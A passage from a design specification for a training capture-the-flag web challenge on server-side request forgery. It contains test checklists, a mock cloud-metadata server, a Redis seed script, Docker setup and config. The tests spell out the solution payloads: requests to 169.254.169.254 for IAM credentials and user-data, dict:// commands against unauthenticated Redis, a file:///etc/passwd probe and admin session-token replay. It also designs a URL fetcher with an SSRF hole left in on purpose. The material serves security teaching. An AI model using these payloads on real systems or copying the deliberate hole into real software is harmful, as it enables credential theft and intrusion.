- [ ] View page source on login page shows the HTML comment referencing `/health`.
- [ ] `POST /api/preview` with `{"url": "http://169.254.169.254/latest/meta-data/"}` returns the metadata directory listing.
- [ ] `POST /api/preview` with `{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/veridian-prod-role"}` returns JSON with the Flag 1 token.
- [ ] The Flag 1 value matches the expected output from `ctf6_generator.js` for the logged-in user.

### Flag 2 Tests

- [ ] `GET /static/CHANGELOG.md` returns the changelog with the `[INFRA]` bootstrap/user-data breadcrumb.
- [ ] `POST /api/preview` with `{"url": "http://169.254.169.254/latest/user-data"}` returns the bootstrap script.
- [ ] The bootstrap script contains `REDIS_HOST=redis`, `REDIS_PORT=6379`, and the `DEPLOY_TOKEN` comment with Flag 2.
- [ ] The Flag 2 value matches the expected output from `ctf6_generator.js` for the logged-in user.

### Flag 3 Tests

- [ ] `POST /api/preview` with `{"url": "dict://redis:6379/INFO server"}` returns Redis server information.
- [ ] `POST /api/preview` with `{"url": "dict://redis:6379/KEYS *"}` returns the list of Redis keys.
- [ ] `POST /api/preview` with `{"url": "dict://redis:6379/GET veridian:flag3"}` returns Flag 3.
- [ ] The Flag 3 value matches the expected output from `ctf6_generator.js` for the logged-in user.

### Flag 4 Tests

- [ ] `POST /api/preview` with `{"url": "dict://redis:6379/GET veridian:session:admin"}` returns the admin session token.
- [ ] `curl http://localhost:5180/admin` without the `X-Session-Token` header returns 403 Forbidden.
- [ ] `curl http://localhost:5180/admin -H "X-Session-Token: vsec-admin-sess-a1b2c3d4e5f6"` returns the admin dashboard with the classified case file and Flag 4.
- [ ] The Flag 4 value matches the expected output from `ctf6_generator.js` for the logged-in user.

### Unintended Path Tests

- [ ] `POST /api/preview` with `{"url": "file:///etc/passwd"}` returns an error (file:// scheme rejected).
- [ ] `POST /api/preview` with `{"url": "http://redis:6379/"}` does not return any flag values in the Redis error response.
- [ ] Accessing `/admin` with a regular login session cookie (no `X-Session-Token` header) returns 403 Forbidden.
- [ ] The metadata mock returns 404 for paths not explicitly implemented (e.g., `/latest/meta-data/hostname`).
- [ ] Redis is not accessible from the host machine on any port.
- [ ] The metadata service is not accessible from the host machine on any port.

### Narrative Tests

- [ ] Blog posts on `/dashboard` include all four posts (Infrastructure Migration Notes, Tech Debt Register, Access Control Audit, Notice: Analyst K. Marsh).
- [ ] The CHANGELOG is accessible from the page footer link and from `/static/CHANGELOG.md`.
- [ ] The admin case file contains the full narrative resolution text.

### Challenge Generation Tests

- [ ] `node chgen_ctf6.js abcd12` generates `flags.json` and `credentials.json` in `CTFs/CTF_6_veridian/`.
- [ ] `node chgen_ctf6.js --count 5` generates flags for 5 random usernames.
- [ ] Running the generator twice with the same username produces identical flag values (deterministic).
- [ ] The `generateBootstrapScript('abcd12')` function returns the complete bootstrap script with Flag 2 interpolated.
- [ ] Flag format matches `durham-vsec-flagN{<20-hex-chars>_<username>}` for all four flags.

---

## 10. CHANGELOG.md Full Content

This is the complete content of the in-game CHANGELOG.md file served at `/static/CHANGELOG.md`. It is also saved as `CTFs/CTF_6_veridian/CHANGELOG.md`.

```markdown
# Veridian Secure Portal -- Changelog

## v3.2.1 (2024-03-12)

- [FIX] Resolved session timeout issue for long-running analyst sessions.
- [UI] Updated dashboard layout for improved navigation.

## v3.2.0 (2024-03-01)

- [FEATURE] Added Link Previewer tool for external intelligence report URLs.
- [SECURITY] Reminder: preview endpoint accepts any URL scheme.
             Ticket raised to restrict to http/https only. (unresolved)
- [INFRA] Migrated session storage to internal Redis instance for performance.
          No authentication configured on the store (legacy deployment).

## v3.1.0 (2024-02-15)

- [INFRA] Bootstrap script embedded in user-data for automated provisioning.
          Rotation of internal service addresses pending.
- [INFRA] Cloud metadata endpoints accessible during transition period.
          Lockdown deferred to Q3 pending IAM policy approval.

## v3.0.0 (2024-01-20)

- [MAJOR] Migrated to cloud-hosted infrastructure.
- [FEATURE] Internal blog system for cross-team communication.
- [SECURITY] Admin dashboard restricted to session token header validation.
             Full RBAC integration planned for v3.3.

## v2.5.0 (2023-11-01)

- [SECURITY] Decommissioned legacy VPN access.
- [INFRA] Internal services moved to Docker containerisation.
```

---

## 11. Per-User Flag Personalisation in Multi-Service Architecture

Because flags are per-user and generated externally, the application must load flag values at startup from a mounted `flags.json` file. This section documents how per-user flags flow through the system.

### Flag Data Flow

1. The challenge generator (`chgen_ctf6.js`) produces `flags.json` and `credentials.json`.
2. Both files are mounted read-only into the app container via Docker Compose volumes.
3. On startup, the Rust app reads `flags.json` and `credentials.json`:
   - User credentials are inserted into the SQLite `users` table.
   - Flag values are stored in an in-memory HashMap keyed by username.
4. The metadata mock server also needs access to per-user flags (Flag 1 in the IAM response, Flag 2 in the bootstrap script). Two approaches:
   - **Approach A (recommended):** The metadata server is not per-user aware. It returns a placeholder response. The app's `/api/preview` handler post-processes the metadata response, replacing placeholder tokens with the authenticated user's actual flag values before returning to the player. This keeps the metadata server stateless and simple.
   - **Approach B:** Mount `flags.json` into the metadata container and pass the requesting username as a query parameter or header. This requires the app to forward user identity to the metadata service, adding complexity.

**Recommended approach: A.** The metadata server returns static responses with placeholder strings (e.g., `__FLAG1_PLACEHOLDER__` and `__FLAG2_PLACEHOLDER__`). The Rust app's preview handler replaces these placeholders with the authenticated user's actual flag values after fetching the response. This keeps the metadata server as a trivial Flask app.

Similarly, for Flag 3 in Redis: the Redis seed script inserts a placeholder value for `veridian:flag3`. The preview handler replaces the placeholder with the user's actual Flag 3 value after fetching from Redis.

For Flag 4 on the admin page: the admin route handler renders the case file template with the authenticated user's Flag 4 value. Since the admin route uses `X-Session-Token` (not a login session), the app must determine the user identity. Two options:
- **Option A:** The admin page shows a generic Flag 4 placeholder, and the player must also be logged in (session cookie) for the flag to be personalised.
- **Option B:** The admin token in Redis includes the username (e.g., `vsec-admin-sess-a1b2c3d4e5f6:abcd12`), and the admin route parses the username from it.
- **Option C (recommended):** The admin route checks both the `X-Session-Token` header AND the login session cookie. The token grants access; the session cookie determines which user's flag to display. This means the player must be logged in AND have the admin token.

**Recommended approach for Flag 4: Option C.** This is the simplest approach that maintains per-user flags and requires no changes to the Redis seed data format.

### Placeholder Replacement Summary

| Service | Placeholder | Replaced By |
|---------|-------------|-------------|
| Metadata (IAM credentials) | `__FLAG1_PLACEHOLDER__` | User's Flag 1 from `flags.json` |
| Metadata (user-data script) | `__FLAG2_PLACEHOLDER__` | User's Flag 2 from `flags.json` |
| Redis (`veridian:flag3`) | `__FLAG3_PLACEHOLDER__` | User's Flag 3 from `flags.json` |
| Admin page template | Template variable `{{ flag4 }}` | User's Flag 4 from `flags.json` |

---

## 12. Docker Compose Specification

```yaml
services:
  app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: veridian-app
    ports:
      - "5180:8080"
    volumes:
      - ./flags.json:/app/flags.json:ro
      - ./credentials.json:/app/credentials.json:ro
    depends_on:
      metadata:
        condition: service_started
      redis:
        condition: service_healthy
    networks:
      veridian-internal:
    restart: unless-stopped

  metadata:
    build:
      context: ./metadata
      dockerfile: Dockerfile
    container_name: veridian-metadata
    networks:
      veridian-internal:
        aliases:
          - "169.254.169.254"
    restart: unless-stopped

  redis:
    build:
      context: ./redis
      dockerfile: Dockerfile
    container_name: veridian-redis
    networks:
      veridian-internal:
        aliases:
          - redis
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5
    restart: unless-stopped

networks:
  veridian-internal:
    driver: bridge
```

**Key points:**
- Only the `app` service has a `ports` directive. Neither `metadata` nor `redis` expose ports to the host.
- The metadata service gets the network alias `169.254.169.254` so the app can reach it at the standard AWS metadata IP.
- The redis service gets the network alias `redis` for hostname resolution.
- `flags.json` and `credentials.json` are mounted read-only into the app container.
- Redis has a healthcheck so the app waits for it to be ready before starting.

---

## 13. Rust Dependency Specification

```toml
[package]
name = "veridian-portal"
version = "0.1.0"
edition = "2021"

[dependencies]
actix-web = "4"
actix-session = { version = "0.9", features = ["cookie-session"] }
actix-files = "0.6"
reqwest = { version = "0.12", features = ["json"] }
rusqlite = { version = "0.31", features = ["bundled"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
tokio = { version = "1", features = ["full"] }
tera = "1"
sha2 = "0.10"
hmac = "0.12"
hex = "0.4"
uuid = { version = "1", features = ["v4"] }
```

**Notes:**
- `reqwest` is used for async HTTP fetching in the preview handler. The blocking feature is NOT enabled.
- `rusqlite` with `bundled` feature compiles SQLite from source, avoiding system library dependencies in Docker.
- `tera` is the template engine for rendering HTML pages.
- `actix-session` with `cookie-session` provides session management via encrypted cookies.
- `sha2`, `hmac`, `hex` are for server-side flag verification if needed (flags are primarily loaded from flags.json).

### Custom dict:// Handler

Since `reqwest` does not support `dict://` natively, the preview handler must implement custom URL parsing:

1. Parse the incoming URL.
2. If the scheme is `http` or `https`, use `reqwest` to fetch normally.
3. If the scheme is `dict`, open a raw TCP connection to the host:port, send the DICT protocol command, read the response, and return it.
4. If the scheme is `file`, return an error.
5. For any other scheme, return an error.

The dict:// handler implementation:

```
Input:  dict://redis:6379/KEYS *
Parsed: host=redis, port=6379, command="KEYS *"

1. Open TCP connection to redis:6379
2. Send: "CLIENT setname dictclient\r\n"  (optional, for cleaner Redis logs)
3. Send: "KEYS *\r\n"
4. Read response until connection closes or timeout
5. Return raw response text
```

The DICT protocol specification sends a `DEFINE` or `MATCH` command after connecting, but in practice, many SSRF tools use the path component as a raw command. The handler should extract the path after the port as the command to send to Redis.

---

## 14. Metadata Mock Server Specification

Single-file Flask application (`metadata_server.py`):

```python
from flask import Flask, Response

app = Flask(__name__)

@app.route("/latest/meta-data/")
def meta_data_root():
    listing = "iam/\niam/security-credentials/\niam/security-credentials/veridian-prod-role\n"
    return Response(listing, mimetype="text/plain")

@app.route("/latest/meta-data/iam/security-credentials/veridian-prod-role")
def iam_credentials():
    return {
        "Code": "Success",
        "Type": "AWS-HMAC",
        "AccessKeyId": "VRDNFAKEKEY01",
        "SecretAccessKey": "wJalrXUtnFEMI/FAKE/KEY",
        "Token": "__FLAG1_PLACEHOLDER__",
        "Expiration": "2099-01-01T00:00:00Z"
    }

@app.route("/latest/user-data")
def user_data():
    script = """#!/bin/bash
# Veridian Secure -- cloud bootstrap script
# Generated: 2024-01-15
# Environment: production-internal

# Service configuration
REDIS_HOST=redis
REDIS_PORT=6379
# internal session store -- no auth configured (legacy deployment)

APP_PORT=8080
APP_HOST=0.0.0.0

# Deployment credentials (rotate quarterly)
# DEPLOY_TOKEN=__FLAG2_PLACEHOLDER__

echo "Bootstrapping Veridian Secure portal..."
echo "Connecting to Redis at $REDIS_HOST:$REDIS_PORT"
echo "Starting application on $APP_HOST:$APP_PORT"
"""
    return Response(script, mimetype="text/plain")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

The metadata server returns placeholder strings. The Rust app's preview handler replaces them with per-user flag values before returning the response to the player.

---

## 15. Redis Seed Script Specification

`redis/seed.sh`:

```bash
#!/bin/bash
set -e

# Wait for Redis to be ready
until redis-cli ping | grep -q PONG; do
  sleep 1
done

# Seed data
redis-cli SET "veridian:session:admin" "vsec-admin-sess-a1b2c3d4e5f6"

redis-cli SET "veridian:incident:2024-03-15" "SUPPRESSED INCIDENT FRAGMENT: Analyst Marsh was in possession of evidence documenting unauthorised surveillance operations. His death on 15 March 2024 occurred three days before his scheduled disclosure to the ICO. Case files sealed by executive order."

redis-cli SET "veridian:flag3" "__FLAG3_PLACEHOLDER__"

echo "Redis seed data loaded."
```

The `redis/Dockerfile` should use `redis:7-alpine` as the base image, copy the seed script, and run it as an entrypoint wrapper around the default Redis server startup.

---

## 16. ctf-config.json Specification

```json
{
  "id": "veridian-ssrf",
  "title": "Veridian Secure -- Server-Side Request Forgery",
  "category": "web",
  "difficulty": "advanced",
  "flagFormat": "durham-vsec-flagN{.*}",
  "flagCount": 4,
  "points": 400,
  "owasp": "A10:2021 Server-Side Request Forgery",
  "description": "Investigate a fictional security firm's internal portal by exploiting SSRF vulnerabilities to reach internal cloud metadata, enumerate network services, pivot to an unauthenticated Redis instance, and replay a cached admin session token.",
  "learningObjectives": [
    "Understanding SSRF attack vectors and impact",
    "Exploiting cloud metadata services (AWS IMDSv1)",
    "Using alternative URL schemes (dict://) for non-HTTP service interaction",
    "Redis enumeration and data exfiltration via SSRF",
    "Session token replay attacks"
  ],
  "techStack": [
    "Rust (Actix-web 4)",
    "Python (Flask metadata mock)",
    "Redis 7",
    "SQLite",
    "Docker Compose"
  ],
  "hints": [
    "The link previewer fetches URLs from the server side. What internal addresses might be reachable?",
    "Cloud instances often have a metadata service at a well-known IP address.",
    "Not all URLs use the http:// scheme. What other schemes might the preview tool accept?",
    "If you find a session token, where might you use it?"
  ],
  "deployment": {
    "port": 5180,
    "command": "docker compose up --build",
    "containers": 3
  }
}
```

---

## 17. README.md Specification

The player-facing README follows the CTF5 README structure:

- Title: `CTF 6 -- Veridian Secure Internal Portal`
- One-line description of the challenge and vulnerability class
- Stack line: `Rust (Actix-web 4), Python (Flask), Redis 7, SQLite`
- Quick Start (Docker) section with `cd` + `docker compose up --build` commands
- What Docker does (3 bullet points: builds Rust app, starts metadata mock, starts Redis)
- Application URL: `http://localhost:5180`
- Health check URL: `http://localhost:5180/health`
- Stop/reset commands
- Login Credentials table (referencing `credentials.json`)
- CTF Flags table (4 flags with technique and difficulty columns)
- Reference to SOLUTIONS.md for instructors
- Vulnerabilities list (bullet points)
- Tech Stack section
- CTF Integration section (references `chgen_ctf6.js`, flag format)
- References section (OWASP SSRF, PortSwigger SSRF, HackTricks SSRF)

---

## 18. Narrative Modification Guide

This section lists every narrative element and whether it can be safely changed without affecting exploit logic.

| Element | Location | Safe to Change? | Notes |
|---------|----------|-----------------|-------|
| Organisation name "Veridian Secure" | Login page, all templates, CHANGELOG | Yes | Update all occurrences consistently |
| Character names (Marsh, Hale, Harding, Torres, Chen) | Blog posts, admin case file | Yes | Names are flavour only |
| Dates (2024-03-15, etc.) | Blog posts, CHANGELOG, case file | Yes | Keep internal consistency |
| Blog post titles | Dashboard template | Partially | "Infrastructure Migration Notes" must mention cloud metadata. "Tech Debt Register" must mention dict:// and Redis. "Access Control Audit" must mention X-Session-Token and session caching. Titles can change but content must preserve these hints. |
| Login page flavour text | Login template | Yes | Purely cosmetic |
| Admin case file body text | Admin template | Yes | Must still contain Flag 4 somewhere in the text |
| Health endpoint field names | routes.rs / health handler | No | `ssrf_note`, `internal_hint`, `admin_route`, `changelog` are breadcrumbs |
| Health endpoint field values | routes.rs / narrative.rs | Partially | Values can be reworded but must convey the same hints |
| CHANGELOG entry text | static/CHANGELOG.md | Partially | Must preserve the `[INFRA]` user-data hint and `[SECURITY]` URL scheme hint |
| HTML comments | Templates | Partially | Must preserve references to `/api/preview`, `/health`, and issue #47 |
| Redis key names | seed.sh, preview handler | No | Keys are part of exploit logic |
| Admin session token value | seed.sh, admin route | No | Value must match between Redis and the admin route check |
| Metadata paths | metadata_server.py | No | Standard AWS metadata paths are part of the exploit |
| Flag format/prefix | Generator, all flag locations | No | Must be `durham-vsec-flagN{...}` |
